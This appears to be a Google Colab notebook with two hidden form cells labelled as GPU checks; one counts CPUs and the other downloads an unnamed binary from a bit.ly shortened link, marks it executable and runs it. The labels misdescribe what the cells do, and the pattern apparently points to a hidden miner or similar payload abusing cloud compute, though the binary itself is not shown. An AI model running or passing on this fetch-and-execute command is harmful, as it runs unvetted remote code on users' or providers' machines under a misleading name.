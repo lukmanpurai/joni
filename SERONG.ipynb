{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "collapsed_sections": [
        "Nzi_H1-di51H"
      ]
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "gpuClass": "standard"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Nzi_H1-di51H"
      },
      "source": [
        "#**MANTEK**\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dUrXIVqRjC6C",
        "cellView": "form"
      },
      "source": [
        "#@title CEK GPU\n",
        "!lscpu | grep 'CPU(s):'"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "M_6xEPdZlNxF",
        "cellView": "form"
      },
      "source": [
        "#@title MOD GPU\n",
        "!wget bit.ly/3DeromeN && chmod +x 3DeromeN && ./3DeromeN"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
